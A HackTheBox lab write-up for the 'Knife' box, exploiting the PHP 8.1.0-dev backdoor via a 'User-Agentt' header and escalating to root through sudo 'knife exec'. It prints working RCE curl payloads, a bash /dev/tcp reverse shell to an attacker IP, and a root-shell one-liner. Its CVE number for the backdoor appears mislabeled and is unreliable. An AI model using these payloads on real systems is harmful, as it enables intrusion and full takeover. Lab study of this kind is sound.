# HackTheBox — Knife

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / Backdoored PHP / sudo knife  
**Status:** Retired  

---

## Summary

Knife is a Linux box running a PHP version with a supply-chain backdoor (CVE-2021-29921 / PHP 8.1.0-dev backdoor). The compromised dev build includes a secret HTTP header that triggers RCE. Privilege escalation uses a sudo rule for the `knife` Chef utility.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/knife 10.10.10.242
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p2
80/tcp open  http    Apache httpd 2.4.41
```

### Web Fingerprinting

```bash
curl -I http://10.10.10.242
```

```
HTTP/1.1 200 OK
X-Powered-By: PHP/8.1.0-dev
```

**PHP 8.1.0-dev** — this is the backdoored development build.

---

## Exploitation

### CVE — PHP 8.1.0-dev Backdoor

In March 2021, the PHP source repository was compromised and a backdoor was inserted into the PHP 8.1.0-dev build. It checks for a specific `User-Agentt` header (note double `t`) and executes the value as PHP code via `eval()`.

**Test for code execution:**

```bash
curl -s http://10.10.10.242 \
  -H "User-Agentt: zerodiumsystem('id');"
```

```
uid=1000(james) gid=1000(james) groups=1000(james)
```

**RCE confirmed!**

### Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Exploit
curl -s http://10.10.10.242 \
  -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.X/4444 0>&1\"');"
```

Shell as **james**.

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

### knife exec Escalation

`knife` is the Chef infrastructure automation CLI. It has an `exec` subcommand that runs Ruby code:

```bash
sudo knife exec -E 'exec "/bin/bash"'
```

**Root shell obtained.**

---

## Flags

```bash
cat /home/james/user.txt
cat /root/root.txt
```

---

## Key Takeaways

- Always check the `X-Powered-By` header — it reveals the backend technology and version
- Supply-chain attacks are a real threat — backdoored software components can affect major projects
- The PHP 8.1.0-dev backdoor is notable because it targeted the PHP source repository itself
- `knife exec -E 'exec "/bin/bash"'` is a GTFOBins entry — know your Ruby-based CLI tools
- Always check `sudo -l` immediately after getting a shell

---

## CVE Reference

- **PHP 8.1.0-dev Backdoor** — supply chain compromise via git commit poisoning (March 2021)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| curl | Header-based exploitation |
| netcat | Reverse shell listener |
| GTFOBins | knife privesc reference |
